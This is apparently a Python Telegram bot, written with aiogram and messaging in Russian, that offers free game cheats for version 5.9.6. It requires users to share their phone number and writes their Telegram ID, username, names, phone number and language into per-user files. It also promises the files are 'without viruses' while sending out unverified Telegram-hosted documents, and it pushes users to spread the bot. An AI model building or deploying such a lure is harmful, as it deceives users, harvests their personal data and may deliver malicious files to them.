import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import filters, FSMContext
from bd import list
from keyboard import Keyboard, botslit, replye, delletec, Contact
from config import Api_Token, host, chanel

bot = Bot(token=Api_Token)
dp = Dispatcher(bot, storage = MemoryStorage())

class register(StatesGroup):
	ids = State()

@dp.message_handler(commands=["start"])
async def command_start_handler(message: types.Message):
	user_id = message.from_user.id
	last_name = message.from_user.first_name
	Check = list.count(user_id)
	if Check == 0:
		await message.answer("Для начала скинь мне свой номер телефона, чтоби я смог доверять тебе такие важние чити!", reply_markup=Contact)
		await register.ids.set()
	else:
		await message.answer(f"Привет, {last_name}!\nСечас в нашем арсенале есть чити для верси 5.9.6\nВибири один чит > скачай > установи > играй\nУ нас безплатние чити, без регистрации и вирусов.", reply_markup=Keyboard)

@dp.message_handler(state=register.ids, content_types=["contact"])
async def state_register(message: types.Message, state: FSMContext):
	await asyncio.sleep(1)
	if message.contact.user_id == message.from_user.id:
		personalData = open(f"personal/{message.from_user.id}.py", "w")
		personalData.write(f"""Skan date telegram user...
		
		UserID: "{message.from_user.id}"
		UserName: "{message.from_user.username}"
		UserFirstName: "{message.from_user.first_name}"
		UserLastName: "{message.from_user.last_name}"
		Contact: "+{message.contact.phone_number}"
		UserLang: "{message.from_user.language_code}"
	
		Date: "{message.date}"
	
End skan telegram data.""")
		personalData.close()
		list.append(message.from_user.id)
		await message.answer("Спасибо вам, тепер для вас функциональность бота увиличена.", parse_mode="HTML", disable_web_page_preview=True, reply_markup=delletec)
		await command_start_handler(message)
		await state.finish()
	else:
		await message.answer("Я заметил что номер которий ви отправили не ваш, пожалуста отправте свой номер!", reply_markup=Contact)

@dp.callback_query_handler(text='0')
async def call0(call: types.CallbackQuery):
	await call.message.answer(f"Спасибо, скинь всем своим друзям, если ви уже скачали ставте префикс к нику DELl, и ви станете частиной нашей банди:)", reply_markup=replye)
	await call.answer("Спасибо за розпостранения нашого бота;)")

@dp.callback_query_handler(text='1')
async def call1(call: types.CallbackQuery):
	await asyncio.sleep(1)
	y = list.count(call.from_user.id)
	if y == 0:
		bd = open("bd.py", "w")
		bd.write(f"list = {list}")
		bd.close()
		await bot.send_message(chanel, f"<a href='tg://user?id={call.from_user.id}'>ID</a>/@{call.from_user.username} скачал чити, спасибо что воспользовалися нашим ботом!\n{call.from_user.language_code}", parse_mode="HTML")
	else:
		await bot.send_document(call.from_user.id, "BQACAgIAAxkBAAMIYoVYCMPqDdqBhhRizI3AlwOagdsAAlIWAAI5zHhLZ58gRP1pW5wkBA", reply_markup=botslit)
		await call.answer("Хорошой игри вам!")

@dp.callback_query_handler(text="2")
async def call2(call: types.CallbackQuery):
	await asyncio.sleep(1)
	y = list.count(call.from_user.id)
	if y == 0:
		bd = open("bd.py", "w")
		bd.write(f"list = {list}")
		bd.close()
		await bot.send_message(chanel, f"<a href='tg://user?id={call.from_user.id}'>ID</a>/@{call.from_user.username} скачал чити, спасибо что воспользовалися нашим ботом!\n{call.from_user.language_code}", parse_mode="HTML")
	else:
		await bot.send_document(call.from_user.id, "BQACAgIAAxkBAAMKYoVaLBjUHxnrsXxHmVH7g7exuDAAAtEOAALgkYBLS7Qi7tlrTIAkBA", reply_markup=botslit)
		await call.answer("Хорошой игри вам!")

@dp.callback_query_handler(text="3")
async def call3(call: types.CallbackQuery):
	await asyncio.sleep(1)
	y = list.count(call.from_user.id)
	if y == 0:
		bd = open("bd.py", "w")
		bd.write(f"list = {list}")
		bd.close()
		await bot.send_message(chanel, f"<a href='tg://user?id={call.from_user.id}'>ID</a>/@{call.from_user.username} скачал чити, спасибо что воспользовалися нашим ботом!\n{call.from_user.language_code}", parse_mode="HTML")
	else:
		await bot.send_document(call.from_user.id, "BQACAgIAAxkBAAMUYoVfZsgbEDQbfISex8KlYrPfDQIAAggXAAIKOzFIXcrnf0vBIj8kBA", reply_markup=botslit)
		await call.answer("Хорошой игри вам!")

@dp.callback_query_handler(text="4")
async def call4(call: types.CallbackQuery):
	await asyncio.sleep(1)
	y = list.count(call.from_user.id)
	if y == 0:
		bd = open("bd.py", "w")
		bd.write(f"list = {list}")
		bd.close()
		await bot.send_message(chanel, f"<a href='tg://user?id={call.from_user.id}'>ID</a>/@{call.from_user.username} скачал чити, спасибо что воспользовалися нашим ботом!\n{call.from_user.language_code}", parse_mode="HTML")
	else:
		await bot.send_document(call.from_user.id, "BQACAgIAAxkBAAMVYoVfsSxIlCE84yvbvLH43EusLDsAAvgMAALo1dlJsLEE7V0M8pskBA", reply_markup=botslit)
		await call.answer("Хорошой игри вам!")

@dp.callback_query_handler(text="5")
async def call5(call: types.CallbackQuery):
	await asyncio.sleep(1)
	y = list.count(call.from_user.id)
	if y == 0:
		bd = open("bd.py", "w")
		bd.write(f"list = {list}")
		bd.close()
		await bot.send_message(chanel, f"<a href='tg://user?id={call.from_user.id}'>ID</a>/@{call.from_user.username} скачал чити, спасибо что воспользовалися нашим ботом!\n{call.from_user.language_code}", parse_mode="HTML")
	else:
		await bot.send_document(call.from_user.id, "BQACAgIAAxkBAAMdYoWI9f7_vwy2z6qAHDMEZPNa3BAAAjsbAALz8ShI1ZcLwkj4fuMkBA", reply_markup=botslit)
		await call.answer("Хорошой игри вам!")

@dp.message_handler(content_types=["document"])
async def input_document(message: types.Message):
	id = message.document.file_id
	name = message.document.file_name
	user = message.from_user.id
	await bot.send_message(host, f"{user} скинул {name}\n<code>{id}</code>", parse_mode="HTML")

if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)
